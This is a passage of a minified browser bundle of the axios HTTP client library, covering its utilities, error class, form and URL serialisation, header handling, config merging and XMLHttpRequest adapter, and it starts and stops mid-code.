                M.writable = !1;
                return
            }
            M.set || (M.set = () => {
                throw Error("Can not rewrite read-only method '" + j + "'")
            }
            )
        }
    }
    )
}
  , toObjectSet = (_, M) => {
    const j = {}
      , O = x => {
        x.forEach(w => {
            j[w] = !0
        }
        )
    }
    ;
    return isArray(_) ? O(_) : O(String(_).split(M)),
    j
}
  , noop = () => {}
  , toFiniteNumber = (_, M) => _ != null && Number.isFinite(_ = +_) ? _ : M;
function isSpecCompliantForm(_) {
    return !!(_ && isFunction(_.append) && _[toStringTag] === "FormData" && _[iterator])
}
const toJSONObject = _ => {
    const M = new Array(10)
      , j = (O, x) => {
        if (isObject(O)) {
            if (M.indexOf(O) >= 0)
                return;
            if (!("toJSON"in O)) {
                M[x] = O;
                const w = isArray(O) ? [] : {};
                return forEach(O, (b, X) => {
                    const Y = j(b, x + 1);
                    !isUndefined(Y) && (w[X] = Y)
                }
                ),
                M[x] = void 0,
                w
            }
        }
        return O
    }
    ;
    return j(_, 0)
}
  , isAsyncFn = kindOfTest("AsyncFunction")
  , isThenable = _ => _ && (isObject(_) || isFunction(_)) && isFunction(_.then) && isFunction(_.catch)
  , _setImmediate = ( (_, M) => _ ? setImmediate : M ? ( (j, O) => (_global.addEventListener("message", ({source: x, data: w}) => {
    x === _global && w === j && O.length && O.shift()()
}
, !1),
x => {
    O.push(x),
    _global.postMessage(j, "*")
}
))(`axios@${Math.random()}`, []) : j => setTimeout(j))(typeof setImmediate == "function", isFunction(_global.postMessage))
  , asap = typeof queueMicrotask < "u" ? queueMicrotask.bind(_global) : typeof process$1 < "u" && process$1.nextTick || _setImmediate
  , isIterable = _ => _ != null && isFunction(_[iterator])
  , utils$1 = {
    isArray,
    isArrayBuffer,
    isBuffer,
    isFormData,
    isArrayBufferView,
    isString,
    isNumber,
    isBoolean,
    isObject,
    isPlainObject,
    isReadableStream,
    isRequest,
    isResponse,
    isHeaders,
    isUndefined,
    isDate,
    isFile,
    isBlob,
    isRegExp,
    isFunction,
    isStream,
    isURLSearchParams,
    isTypedArray,
    isFileList,
    forEach,
    merge,
    extend,
    trim,
    stripBOM,
    inherits,
    toFlatObject,
    kindOf,
    kindOfTest,
    endsWith,
    toArray,
    forEachEntry,
    matchAll,
    isHTMLForm,
    hasOwnProperty,
    hasOwnProp: hasOwnProperty,
    reduceDescriptors,
    freezeMethods,
    toObjectSet,
    toCamelCase,
    noop,
    toFiniteNumber,
    findKey,
    global: _global,
    isContextDefined,
    isSpecCompliantForm,
    toJSONObject,
    isAsyncFn,
    isThenable,
    setImmediate: _setImmediate,
    asap,
    isIterable
};
function AxiosError$1(_, M, j, O, x) {
    Error.call(this),
    Error.captureStackTrace ? Error.captureStackTrace(this, this.constructor) : this.stack = new Error().stack,
    this.message = _,
    this.name = "AxiosError",
    M && (this.code = M),
    j && (this.config = j),
    O && (this.request = O),
    x && (this.response = x,
    this.status = x.status ? x.status : null)
}
utils$1.inherits(AxiosError$1, Error, {
    toJSON: function _() {
        return {
            message: this.message,
            name: this.name,
            description: this.description,
            number: this.number,
            fileName: this.fileName,
            lineNumber: this.lineNumber,
            columnNumber: this.columnNumber,
            stack: this.stack,
            config: utils$1.toJSONObject(this.config),
            code: this.code,
            status: this.status
        }
    }
});
const prototype$1 = AxiosError$1.prototype
  , descriptors = {};
["ERR_BAD_OPTION_VALUE", "ERR_BAD_OPTION", "ECONNABORTED", "ETIMEDOUT", "ERR_NETWORK", "ERR_FR_TOO_MANY_REDIRECTS", "ERR_DEPRECATED", "ERR_BAD_RESPONSE", "ERR_BAD_REQUEST", "ERR_CANCELED", "ERR_NOT_SUPPORT", "ERR_INVALID_URL"].forEach(_ => {
    descriptors[_] = {
        value: _
    }
}
);
Object.defineProperties(AxiosError$1, descriptors);
Object.defineProperty(prototype$1, "isAxiosError", {
    value: !0
});
AxiosError$1.from = (_, M, j, O, x, w) => {
    const b = Object.create(prototype$1);
    return utils$1.toFlatObject(_, b, function(Y) {
        return Y !== Error.prototype
    }, X => X !== "isAxiosError"),
    AxiosError$1.call(b, _.message, M, j, O, x),
    b.cause = _,
    b.name = _.name,
    w && Object.assign(b, w),
    b
}
;
const httpAdapter = null;
function isVisitable(_) {
    return utils$1.isPlainObject(_) || utils$1.isArray(_)
}
function removeBrackets(_) {
    return utils$1.endsWith(_, "[]") ? _.slice(0, -2) : _
}
function renderKey(_, M, j) {
    return _ ? _.concat(M).map(function(x, w) {
        return x = removeBrackets(x),
        !j && w ? "[" + x + "]" : x
    }).join(j ? "." : "") : M
}
function isFlatArray(_) {
    return utils$1.isArray(_) && !_.some(isVisitable)
}
const predicates = utils$1.toFlatObject(utils$1, {}, null, function _(M) {
    return /^is[A-Z]/.test(M)
});
function toFormData$1(_, M, j) {
    if (!utils$1.isObject(_))
        throw new TypeError("target must be an object");
    M = M || new FormData,
    j = utils$1.toFlatObject(j, {
        metaTokens: !0,
        dots: !1,
        indexes: !1
    }, !1, function(ne, oe) {
        return !utils$1.isUndefined(oe[ne])
    });
    const O = j.metaTokens
      , x = j.visitor || V
      , w = j.dots
      , b = j.indexes
      , Y = (j.Blob || typeof Blob < "u" && Blob) && utils$1.isSpecCompliantForm(M);
    if (!utils$1.isFunction(x))
        throw new TypeError("visitor must be a function");
    function F(ae) {
        if (ae === null)
            return "";
        if (utils$1.isDate(ae))
            return ae.toISOString();
        if (!Y && utils$1.isBlob(ae))
            throw new AxiosError$1("Blob is not supported. Use a Buffer instead.");
        return utils$1.isArrayBuffer(ae) || utils$1.isTypedArray(ae) ? Y && typeof Blob == "function" ? new Blob([ae]) : Buffer.from(ae) : ae
    }
    function V(ae, ne, oe) {
        let ue = ae;
        if (ae && !oe && typeof ae == "object") {
            if (utils$1.endsWith(ne, "{}"))
                ne = O ? ne : ne.slice(0, -2),
                ae = JSON.stringify(ae);
            else if (utils$1.isArray(ae) && isFlatArray(ae) || (utils$1.isFileList(ae) || utils$1.endsWith(ne, "[]")) && (ue = utils$1.toArray(ae)))
                return ne = removeBrackets(ne),
                ue.forEach(function(he, pe) {
                    !(utils$1.isUndefined(he) || he === null) && M.append(b === !0 ? renderKey([ne], pe, w) : b === null ? ne : ne + "[]", F(he))
                }),
                !1
        }
        return isVisitable(ae) ? !0 : (M.append(renderKey(oe, ne, w), F(ae)),
        !1)
    }
    const K = []
      , Q = Object.assign(predicates, {
        defaultVisitor: V,
        convertValue: F,
        isVisitable
    });
    function ee(ae, ne) {
        if (!utils$1.isUndefined(ae)) {
            if (K.indexOf(ae) !== -1)
                throw Error("Circular reference detected in " + ne.join("."));
            K.push(ae),
            utils$1.forEach(ae, function(ue, fe) {
                (!(utils$1.isUndefined(ue) || ue === null) && x.call(M, ue, utils$1.isString(fe) ? fe.trim() : fe, ne, Q)) === !0 && ee(ue, ne ? ne.concat(fe) : [fe])
            }),
            K.pop()
        }
    }
    if (!utils$1.isObject(_))
        throw new TypeError("data must be an object");
    return ee(_),
    M
}
function encode$1(_) {
    const M = {
        "!": "%21",
        "'": "%27",
        "(": "%28",
        ")": "%29",
        "~": "%7E",
        "%20": "+",
        "%00": "\0"
    };
    return encodeURIComponent(_).replace(/[!'()~]|%20|%00/g, function(O) {
        return M[O]
    })
}
function AxiosURLSearchParams(_, M) {
    this._pairs = [],
    _ && toFormData$1(_, this, M)
}
const prototype = AxiosURLSearchParams.prototype;
prototype.append = function _(M, j) {
    this._pairs.push([M, j])
}
;
prototype.toString = function _(M) {
    const j = M ? function(O) {
        return M.call(this, O, encode$1)
    }
    : encode$1;
    return this._pairs.map(function(x) {
        return j(x[0]) + "=" + j(x[1])
    }, "").join("&")
}
;
function encode(_) {
    return encodeURIComponent(_).replace(/%3A/gi, ":").replace(/%24/g, "$").replace(/%2C/gi, ",").replace(/%20/g, "+").replace(/%5B/gi, "[").replace(/%5D/gi, "]")
}
function buildURL(_, M, j) {
    if (!M)
        return _;
    const O = j && j.encode || encode;
    utils$1.isFunction(j) && (j = {
        serialize: j
    });
    const x = j && j.serialize;
    let w;
    if (x ? w = x(M, j) : w = utils$1.isURLSearchParams(M) ? M.toString() : new AxiosURLSearchParams(M,j).toString(O),
    w) {
        const b = _.indexOf("#");
        b !== -1 && (_ = _.slice(0, b)),
        _ += (_.indexOf("?") === -1 ? "?" : "&") + w
    }
    return _
}
class InterceptorManager {
    constructor() {
        this.handlers = []
    }
    use(M, j, O) {
        return this.handlers.push({
            fulfilled: M,
            rejected: j,
            synchronous: O ? O.synchronous : !1,
            runWhen: O ? O.runWhen : null
        }),
        this.handlers.length - 1
    }
    eject(M) {
        this.handlers[M] && (this.handlers[M] = null)
    }
    clear() {
        this.handlers && (this.handlers = [])
    }
    forEach(M) {
        utils$1.forEach(this.handlers, function(O) {
            O !== null && M(O)
        })
    }
}
const transitionalDefaults = {
    silentJSONParsing: !0,
    forcedJSONParsing: !0,
    clarifyTimeoutError: !1
}
  , URLSearchParams$1 = typeof URLSearchParams < "u" ? URLSearchParams : AxiosURLSearchParams
  , FormData$1 = typeof FormData < "u" ? FormData : null
  , Blob$1 = typeof Blob < "u" ? Blob : null
  , platform$1 = {
    isBrowser: !0,
    classes: {
        URLSearchParams: URLSearchParams$1,
        FormData: FormData$1,
        Blob: Blob$1
    },
    protocols: ["http", "https", "file", "blob", "url", "data"]
}
  , hasBrowserEnv = typeof window < "u" && typeof document < "u"
  , _navigator = typeof navigator == "object" && navigator || void 0
  , hasStandardBrowserEnv = hasBrowserEnv && (!_navigator || ["ReactNative", "NativeScript", "NS"].indexOf(_navigator.product) < 0)
  , hasStandardBrowserWebWorkerEnv = typeof WorkerGlobalScope < "u" && self instanceof WorkerGlobalScope && typeof self.importScripts == "function"
  , origin = hasBrowserEnv && window.location.href || "http://localhost"
  , utils = Object.freeze(Object.defineProperty({
    __proto__: null,
    hasBrowserEnv,
    hasStandardBrowserEnv,
    hasStandardBrowserWebWorkerEnv,
    navigator: _navigator,
    origin
}, Symbol.toStringTag, {
    value: "Module"
}))
  , platform = {
    ...utils,
    ...platform$1
};
function toURLEncodedForm(_, M) {
    return toFormData$1(_, new platform.classes.URLSearchParams, Object.assign({
        visitor: function(j, O, x, w) {
            return platform.isNode && utils$1.isBuffer(j) ? (this.append(O, j.toString("base64")),
            !1) : w.defaultVisitor.apply(this, arguments)
        }
    }, M))
}
function parsePropPath(_) {
    return utils$1.matchAll(/\w+|\[(\w*)]/g, _).map(M => M[0] === "[]" ? "" : M[1] || M[0])
}
function arrayToObject(_) {
    const M = {}
      , j = Object.keys(_);
    let O;
    const x = j.length;
    let w;
    for (O = 0; O < x; O++)
        w = j[O],
        M[w] = _[w];
    return M
}
function formDataToJSON(_) {
    function M(j, O, x, w) {
        let b = j[w++];
        if (b === "__proto__")
            return !0;
        const X = Number.isFinite(+b)
          , Y = w >= j.length;
        return b = !b && utils$1.isArray(x) ? x.length : b,
        Y ? (utils$1.hasOwnProp(x, b) ? x[b] = [x[b], O] : x[b] = O,
        !X) : ((!x[b] || !utils$1.isObject(x[b])) && (x[b] = []),
        M(j, O, x[b], w) && utils$1.isArray(x[b]) && (x[b] = arrayToObject(x[b])),
        !X)
    }
    if (utils$1.isFormData(_) && utils$1.isFunction(_.entries)) {
        const j = {};
        return utils$1.forEachEntry(_, (O, x) => {
            M(parsePropPath(O), x, j, 0)
        }
        ),
        j
    }
    return null
}
function stringifySafely(_, M, j) {
    if (utils$1.isString(_))
        try {
            return (M || JSON.parse)(_),
            utils$1.trim(_)
        } catch (O) {
            if (O.name !== "SyntaxError")
                throw O
        }
    return (j || JSON.stringify)(_)
}
const defaults = {
    transitional: transitionalDefaults,
    adapter: ["xhr", "http", "fetch"],
    transformRequest: [function _(M, j) {
        const O = j.getContentType() || ""
          , x = O.indexOf("application/json") > -1
          , w = utils$1.isObject(M);
        if (w && utils$1.isHTMLForm(M) && (M = new FormData(M)),
        utils$1.isFormData(M))
            return x ? JSON.stringify(formDataToJSON(M)) : M;
        if (utils$1.isArrayBuffer(M) || utils$1.isBuffer(M) || utils$1.isStream(M) || utils$1.isFile(M) || utils$1.isBlob(M) || utils$1.isReadableStream(M))
            return M;
        if (utils$1.isArrayBufferView(M))
            return M.buffer;
        if (utils$1.isURLSearchParams(M))
            return j.setContentType("application/x-www-form-urlencoded;charset=utf-8", !1),
            M.toString();
        let X;
        if (w) {
            if (O.indexOf("application/x-www-form-urlencoded") > -1)
                return toURLEncodedForm(M, this.formSerializer).toString();
            if ((X = utils$1.isFileList(M)) || O.indexOf("multipart/form-data") > -1) {
                const Y = this.env && this.env.FormData;
                return toFormData$1(X ? {
                    "files[]": M
                } : M, Y && new Y, this.formSerializer)
            }
        }
        return w || x ? (j.setContentType("application/json", !1),
        stringifySafely(M)) : M
    }
    ],
    transformResponse: [function _(M) {
        const j = this.transitional || defaults.transitional
          , O = j && j.forcedJSONParsing
          , x = this.responseType === "json";
        if (utils$1.isResponse(M) || utils$1.isReadableStream(M))
            return M;
        if (M && utils$1.isString(M) && (O && !this.responseType || x)) {
            const b = !(j && j.silentJSONParsing) && x;
            try {
                return JSON.parse(M)
            } catch (X) {
                if (b)
                    throw X.name === "SyntaxError" ? AxiosError$1.from(X, AxiosError$1.ERR_BAD_RESPONSE, this, null, this.response) : X
            }
        }
        return M
    }
    ],
    timeout: 0,
    xsrfCookieName: "XSRF-TOKEN",
    xsrfHeaderName: "X-XSRF-TOKEN",
    maxContentLength: -1,
    maxBodyLength: -1,
    env: {
        FormData: platform.classes.FormData,
        Blob: platform.classes.Blob
    },
    validateStatus: function _(M) {
        return M >= 200 && M < 300
    },
    headers: {
        common: {
            Accept: "application/json, text/plain, */*",
            "Content-Type": void 0
        }
    }
};
utils$1.forEach(["delete", "get", "head", "post", "put", "patch"], _ => {
    defaults.headers[_] = {}
}
);
const ignoreDuplicateOf = utils$1.toObjectSet(["age", "authorization", "content-length", "content-type", "etag", "expires", "from", "host", "if-modified-since", "if-unmodified-since", "last-modified", "location", "max-forwards", "proxy-authorization", "referer", "retry-after", "user-agent"])
  , parseHeaders = _ => {
    const M = {};
    let j, O, x;
    return _ && _.split(`
`).forEach(function(b) {
        x = b.indexOf(":"),
        j = b.substring(0, x).trim().toLowerCase(),
        O = b.substring(x + 1).trim(),
        !(!j || M[j] && ignoreDuplicateOf[j]) && (j === "set-cookie" ? M[j] ? M[j].push(O) : M[j] = [O] : M[j] = M[j] ? M[j] + ", " + O : O)
    }),
    M
}
  , $internals = Symbol("internals");
function normalizeHeader(_) {
    return _ && String(_).trim().toLowerCase()
}
function normalizeValue(_) {
    return _ === !1 || _ == null ? _ : utils$1.isArray(_) ? _.map(normalizeValue) : String(_)
}
function parseTokens(_) {
    const M = Object.create(null)
      , j = /([^\s,;=]+)\s*(?:=\s*([^,;]+))?/g;
    let O;
    for (; O = j.exec(_); )
        M[O[1]] = O[2];
    return M
}
const isValidHeaderName = _ => /^[-_a-zA-Z0-9^`|~,!#$%&'*+.]+$/.test(_.trim());
function matchHeaderValue(_, M, j, O, x) {
    if (utils$1.isFunction(O))
        return O.call(this, M, j);
    if (x && (M = j),
    !!utils$1.isString(M)) {
        if (utils$1.isString(O))
            return M.indexOf(O) !== -1;
        if (utils$1.isRegExp(O))
            return O.test(M)
    }
}
function formatHeader(_) {
    return _.trim().toLowerCase().replace(/([a-z\d])(\w*)/g, (M, j, O) => j.toUpperCase() + O)
}
function buildAccessors(_, M) {
    const j = utils$1.toCamelCase(" " + M);
    ["get", "set", "has"].forEach(O => {
        Object.defineProperty(_, O + j, {
            value: function(x, w, b) {
                return this[O].call(this, M, x, w, b)
            },
            configurable: !0
        })
    }
    )
}
let AxiosHeaders$1 = class {
    constructor(M) {
        M && this.set(M)
    }
    set(M, j, O) {
        const x = this;
        function w(X, Y, F) {
            const V = normalizeHeader(Y);
            if (!V)
                throw new Error("header name must be a non-empty string");
            const K = utils$1.findKey(x, V);
            (!K || x[K] === void 0 || F === !0 || F === void 0 && x[K] !== !1) && (x[K || Y] = normalizeValue(X))
        }
        const b = (X, Y) => utils$1.forEach(X, (F, V) => w(F, V, Y));
        if (utils$1.isPlainObject(M) || M instanceof this.constructor)
            b(M, j);
        else if (utils$1.isString(M) && (M = M.trim()) && !isValidHeaderName(M))
            b(parseHeaders(M), j);
        else if (utils$1.isObject(M) && utils$1.isIterable(M)) {
            let X = {}, Y, F;
            for (const V of M) {
                if (!utils$1.isArray(V))
                    throw TypeError("Object iterator must return a key-value pair");
                X[F = V[0]] = (Y = X[F]) ? utils$1.isArray(Y) ? [...Y, V[1]] : [Y, V[1]] : V[1]
            }
            b(X, j)
        } else
            M != null && w(j, M, O);
        return this
    }
    get(M, j) {
        if (M = normalizeHeader(M),
        M) {
            const O = utils$1.findKey(this, M);
            if (O) {
                const x = this[O];
                if (!j)
                    return x;
                if (j === !0)
                    return parseTokens(x);
                if (utils$1.isFunction(j))
                    return j.call(this, x, O);
                if (utils$1.isRegExp(j))
                    return j.exec(x);
                throw new TypeError("parser must be boolean|regexp|function")
            }
        }
    }
    has(M, j) {
        if (M = normalizeHeader(M),
        M) {
            const O = utils$1.findKey(this, M);
            return !!(O && this[O] !== void 0 && (!j || matchHeaderValue(this, this[O], O, j)))
        }
        return !1
    }
    delete(M, j) {
        const O = this;
        let x = !1;
        function w(b) {
            if (b = normalizeHeader(b),
            b) {
                const X = utils$1.findKey(O, b);
                X && (!j || matchHeaderValue(O, O[X], X, j)) && (delete O[X],
                x = !0)
            }
        }
        return utils$1.isArray(M) ? M.forEach(w) : w(M),
        x
    }
    clear(M) {
        const j = Object.keys(this);
        let O = j.length
          , x = !1;
        for (; O--; ) {
            const w = j[O];
            (!M || matchHeaderValue(this, this[w], w, M, !0)) && (delete this[w],
            x = !0)
        }
        return x
    }
    normalize(M) {
        const j = this
          , O = {};
        return utils$1.forEach(this, (x, w) => {
            const b = utils$1.findKey(O, w);
            if (b) {
                j[b] = normalizeValue(x),
                delete j[w];
                return
            }
            const X = M ? formatHeader(w) : String(w).trim();
            X !== w && delete j[w],
            j[X] = normalizeValue(x),
            O[X] = !0
        }
        ),
        this
    }
    concat(...M) {
        return this.constructor.concat(this, ...M)
    }
    toJSON(M) {
        const j = Object.create(null);
        return utils$1.forEach(this, (O, x) => {
            O != null && O !== !1 && (j[x] = M && utils$1.isArray(O) ? O.join(", ") : O)
        }
        ),
        j
    }
    [Symbol.iterator]() {
        return Object.entries(this.toJSON())[Symbol.iterator]()
    }
    toString() {
        return Object.entries(this.toJSON()).map( ([M,j]) => M + ": " + j).join(`
`)
    }
    getSetCookie() {
        return this.get("set-cookie") || []
    }
    get[Symbol.toStringTag]() {
        return "AxiosHeaders"
    }
    static from(M) {
        return M instanceof this ? M : new this(M)
    }
    static concat(M, ...j) {
        const O = new this(M);
        return j.forEach(x => O.set(x)),
        O
    }
    static accessor(M) {
        const O = (this[$internals] = this[$internals] = {
            accessors: {}
        }).accessors
          , x = this.prototype;
        function w(b) {
            const X = normalizeHeader(b);
            O[X] || (buildAccessors(x, b),
            O[X] = !0)
        }
        return utils$1.isArray(M) ? M.forEach(w) : w(M),
        this
    }
}
;
AxiosHeaders$1.accessor(["Content-Type", "Content-Length", "Accept", "Accept-Encoding", "User-Agent", "Authorization"]);
utils$1.reduceDescriptors(AxiosHeaders$1.prototype, ({value: _}, M) => {
    let j = M[0].toUpperCase() + M.slice(1);
    return {
        get: () => _,
        set(O) {
            this[j] = O
        }
    }
}
);
utils$1.freezeMethods(AxiosHeaders$1);
function transformData(_, M) {
    const j = this || defaults
      , O = M || j
      , x = AxiosHeaders$1.from(O.headers);
    let w = O.data;
    return utils$1.forEach(_, function(X) {
        w = X.call(j, w, x.normalize(), M ? M.status : void 0)
    }),
    x.normalize(),
    w
}
function isCancel$1(_) {
    return !!(_ && _.__CANCEL__)
}
function CanceledError$1(_, M, j) {
    AxiosError$1.call(this, _ ?? "canceled", AxiosError$1.ERR_CANCELED, M, j),
    this.name = "CanceledError"
}
utils$1.inherits(CanceledError$1, AxiosError$1, {
    __CANCEL__: !0
});
function settle(_, M, j) {
    const O = j.config.validateStatus;
    !j.status || !O || O(j.status) ? _(j) : M(new AxiosError$1("Request failed with status code " + j.status,[AxiosError$1.ERR_BAD_REQUEST, AxiosError$1.ERR_BAD_RESPONSE][Math.floor(j.status / 100) - 4],j.config,j.request,j))
}
function parseProtocol(_) {
    const M = /^([-+\w]{1,25})(:?\/\/|:)/.exec(_);
    return M && M[1] || ""
}
function speedometer(_, M) {
    _ = _ || 10;
    const j = new Array(_)
      , O = new Array(_);
    let x = 0, w = 0, b;
    return M = M !== void 0 ? M : 1e3,
    function(Y) {
        const F = Date.now()
          , V = O[w];
        b || (b = F),
        j[x] = Y,
        O[x] = F;
        let K = w
          , Q = 0;
        for (; K !== x; )
            Q += j[K++],
            K = K % _;
        if (x = (x + 1) % _,
        x === w && (w = (w + 1) % _),
        F - b < M)
            return;
        const ee = V && F - V;
        return ee ? Math.round(Q * 1e3 / ee) : void 0
    }
}
function throttle(_, M) {
    let j = 0, O = 1e3 / M, x, w;
    const b = (F, V=Date.now()) => {
        j = V,
        x = null,
        w && (clearTimeout(w),
        w = null),
        _.apply(null, F)
    }
    ;
    return [ (...F) => {
        const V = Date.now()
          , K = V - j;
        K >= O ? b(F, V) : (x = F,
        w || (w = setTimeout( () => {
            w = null,
            b(x)
        }
        , O - K)))
    }
    , () => x && b(x)]
}
const progressEventReducer = (_, M, j=3) => {
    let O = 0;
    const x = speedometer(50, 250);
    return throttle(w => {
        const b = w.loaded
          , X = w.lengthComputable ? w.total : void 0
          , Y = b - O
          , F = x(Y)
          , V = b <= X;
        O = b;
        const K = {
            loaded: b,
            total: X,
            progress: X ? b / X : void 0,
            bytes: Y,
            rate: F || void 0,
            estimated: F && X && V ? (X - b) / F : void 0,
            event: w,
            lengthComputable: X != null,
            [M ? "download" : "upload"]: !0
        };
        _(K)
    }
    , j)
}
  , progressEventDecorator = (_, M) => {
    const j = _ != null;
    return [O => M[0]({
        lengthComputable: j,
        total: _,
        loaded: O
    }), M[1]]
}
  , asyncDecorator = _ => (...M) => utils$1.asap( () => _(...M))
  , isURLSameOrigin = platform.hasStandardBrowserEnv ? ( (_, M) => j => (j = new URL(j,platform.origin),
_.protocol === j.protocol && _.host === j.host && (M || _.port === j.port)))(new URL(platform.origin), platform.navigator && /(msie|trident)/i.test(platform.navigator.userAgent)) : () => !0
  , cookies = platform.hasStandardBrowserEnv ? {
    write(_, M, j, O, x, w) {
        const b = [_ + "=" + encodeURIComponent(M)];
        utils$1.isNumber(j) && b.push("expires=" + new Date(j).toGMTString()),
        utils$1.isString(O) && b.push("path=" + O),
        utils$1.isString(x) && b.push("domain=" + x),
        w === !0 && b.push("secure"),
        document.cookie = b.join("; ")
    },
    read(_) {
        const M = document.cookie.match(new RegExp("(^|;\\s*)(" + _ + ")=([^;]*)"));
        return M ? decodeURIComponent(M[3]) : null
    },
    remove(_) {
        this.write(_, "", Date.now() - 864e5)
    }
} : {
    write() {},
    read() {
        return null
    },
    remove() {}
};
function isAbsoluteURL(_) {
    return /^([a-z][a-z\d+\-.]*:)?\/\//i.test(_)
}
function combineURLs(_, M) {
    return M ? _.replace(/\/?\/$/, "") + "/" + M.replace(/^\/+/, "") : _
}
function buildFullPath(_, M, j) {
    let O = !isAbsoluteURL(M);
    return _ && (O || j == !1) ? combineURLs(_, M) : M
}
const headersToObject = _ => _ instanceof AxiosHeaders$1 ? {
    ..._
} : _;
function mergeConfig$1(_, M) {
    M = M || {};
    const j = {};
    function O(F, V, K, Q) {
        return utils$1.isPlainObject(F) && utils$1.isPlainObject(V) ? utils$1.merge.call({
            caseless: Q
        }, F, V) : utils$1.isPlainObject(V) ? utils$1.merge({}, V) : utils$1.isArray(V) ? V.slice() : V
    }
    function x(F, V, K, Q) {
        if (utils$1.isUndefined(V)) {
            if (!utils$1.isUndefined(F))
                return O(void 0, F, K, Q)
        } else
            return O(F, V, K, Q)
    }
    function w(F, V) {
        if (!utils$1.isUndefined(V))
            return O(void 0, V)
    }
    function b(F, V) {
        if (utils$1.isUndefined(V)) {
            if (!utils$1.isUndefined(F))
                return O(void 0, F)
        } else
            return O(void 0, V)
    }
    function X(F, V, K) {
        if (K in M)
            return O(F, V);
        if (K in _)
            return O(void 0, F)
    }
    const Y = {
        url: w,
        method: w,
        data: w,
        baseURL: b,
        transformRequest: b,
        transformResponse: b,
        paramsSerializer: b,
        timeout: b,
        timeoutMessage: b,
        withCredentials: b,
        withXSRFToken: b,
        adapter: b,
        responseType: b,
        xsrfCookieName: b,
        xsrfHeaderName: b,
        onUploadProgress: b,
        onDownloadProgress: b,
        decompress: b,
        maxContentLength: b,
        maxBodyLength: b,
        beforeRedirect: b,
        transport: b,
        httpAgent: b,
        httpsAgent: b,
        cancelToken: b,
        socketPath: b,
        responseEncoding: b,
        validateStatus: X,
        headers: (F, V, K) => x(headersToObject(F), headersToObject(V), K, !0)
    };
    return utils$1.forEach(Object.keys(Object.assign({}, _, M)), function(V) {
        const K = Y[V] || x
          , Q = K(_[V], M[V], V);
        utils$1.isUndefined(Q) && K !== X || (j[V] = Q)
    }),
    j
}
const resolveConfig = _ => {
    const M = mergeConfig$1({}, _);
    let {data: j, withXSRFToken: O, xsrfHeaderName: x, xsrfCookieName: w, headers: b, auth: X} = M;
    M.headers = b = AxiosHeaders$1.from(b),
    M.url = buildURL(buildFullPath(M.baseURL, M.url, M.allowAbsoluteUrls), _.params, _.paramsSerializer),
    X && b.set("Authorization", "Basic " + btoa((X.username || "") + ":" + (X.password ? unescape(encodeURIComponent(X.password)) : "")));
    let Y;
    if (utils$1.isFormData(j)) {
        if (platform.hasStandardBrowserEnv || platform.hasStandardBrowserWebWorkerEnv)
            b.setContentType(void 0);
        else if ((Y = b.getContentType()) !== !1) {
            const [F,...V] = Y ? Y.split(";").map(K => K.trim()).filter(Boolean) : [];
            b.setContentType([F || "multipart/form-data", ...V].join("; "))
        }
    }
    if (platform.hasStandardBrowserEnv && (O && utils$1.isFunction(O) && (O = O(M)),
    O || O !== !1 && isURLSameOrigin(M.url))) {
        const F = x && w && cookies.read(w);
        F && b.set(x, F)
    }
    return M
}
  , isXHRAdapterSupported = typeof XMLHttpRequest < "u"
  , xhrAdapter = isXHRAdapterSupported && function(_) {
    return new Promise(function(j, O) {
        const x = resolveConfig(_);
        let w = x.data;
        const b = AxiosHeaders$1.from(x.headers).normalize();
        let {responseType: X, onUploadProgress: Y, onDownloadProgress: F} = x, V, K, Q, ee, ae;
        function ne() {
            ee && ee(),
            ae && ae(),
            x.cancelToken && x.cancelToken.unsubscribe(V),
            x.signal && x.signal.removeEventListener("abort", V)
        }
        let oe = new XMLHttpRequest;
        oe.open(x.method.toUpperCase(), x.url, !0),
        oe.timeout = x.timeout;
        function ue() {
            if (!oe)
                return;
            const he = AxiosHeaders$1.from("getAllResponseHeaders"in oe && oe.getAllResponseHeaders())
              , ye = {
                data: !X || X === "text" || X === "json" ? oe.responseText : oe.response,
                status: oe.status,
                statusText: oe.statusText,
                headers: he,
                config: _,
                request: oe
            };
            settle(function(xe) {
                j(xe),
                ne()
            }, function(xe) {
                O(xe),
                ne()
            }, ye),
            oe = null
        }
        "onloadend"in oe ? oe.onloadend = ue : oe.onreadystatechange = function() {
            !oe || oe.readyState !== 4 || oe.status === 0 && !(oe.responseURL && oe.responseURL.indexOf("file:") === 0) || setTimeout(ue)
        }
        ,
        oe.onabort = function() {
            oe && (O(new AxiosError$1("Request aborted",AxiosError$1.ECONNABORTED,_,oe)),
            oe = null)
        }
        ,
        oe.onerror = function() {
            O(new AxiosError$1("Network Error",AxiosError$1.ERR_NETWORK,_,oe)),
            oe = null
        }
        ,
        oe.ontimeout = function() {
            let pe = x.timeout ? "timeout of " + x.timeout + "ms exceeded" : "timeout exceeded";
            const ye = x.transitional || transitionalDefaults;
            x.timeoutErrorMessage && (pe = x.timeoutErrorMessage),
            O(new AxiosError$1(pe,ye.clarifyTimeoutError ? AxiosError$1.ETIMEDOUT : AxiosError$1.ECONNABORTED,_,oe)),
            oe = null
        }
        ,
        w === void 0 && b.setContentType(null),
        "setRequestHeader"in oe && utils$1.forEach(b.toJSON(), function(pe, ye) {
            oe.setRequestHeader(ye, pe)
        }),
        utils$1.isUndefined(x.withCredentials) || (oe.withCredentials = !!x.withCredentials),
        X && X !== "json" && (oe.responseType = x.responseType),
        F && ([Q,ae] = progressEventReducer(F, !0),
        oe.addEventListener("progress", Q)),
        Y && oe.upload && ([K,ee] = progressEventReducer(Y),
        oe.upload.addEventListener("progress", K),
        oe.upload.addEventListener("loadend", ee)),
        (x.cancelToken || x.signal) && (V = he => {
            oe && (O(!he || he.type ? new CanceledError$1(null,_,oe) : he),
            oe.abort(),
            oe = null)
        }
        ,
        x.cancelToken && x.cancelToken.subscribe(V),
        x.signal && (x.signal.aborted ? V() : x.signal.addEventListener("abort", V)));
        const fe = parseProtocol(x.url);
        if (fe && platform.protocols.indexOf(fe) === -1) {
            O(new AxiosError$1("Unsupported protocol " + fe + ":",AxiosError$1.ERR_BAD_REQUEST,_));
            return
        }
        oe.send(w || null)
    }
    )
}
  , composeSignals = (_, M) => {
    const {length: j} = _ = _ ? _.filter(Boolean) : [];
    if (M || j) {
        let O = new AbortController, x;
        const w = function(F) {
            if (!x) {
                x = !0,
                X();
                const V = F instanceof Error ? F : this.reason;
                O.abort(V instanceof AxiosError$1 ? V : new CanceledError$1(V instanceof Error ? V.message : V))
            }
        };
        let b = M && setTimeout( () => {
            b = null,
            w(new AxiosError$1(`timeout ${M} of ms exceeded`,AxiosError$1.ETIMEDOUT))
        }
        , M);
        const X = () => {
            _ && (b && clearTimeout(b),
            b = null,
            _.forEach(F => {
                F.unsubscribe ? F.unsubscribe(w) : F.removeEventListener("abort", w)
            }
            ),
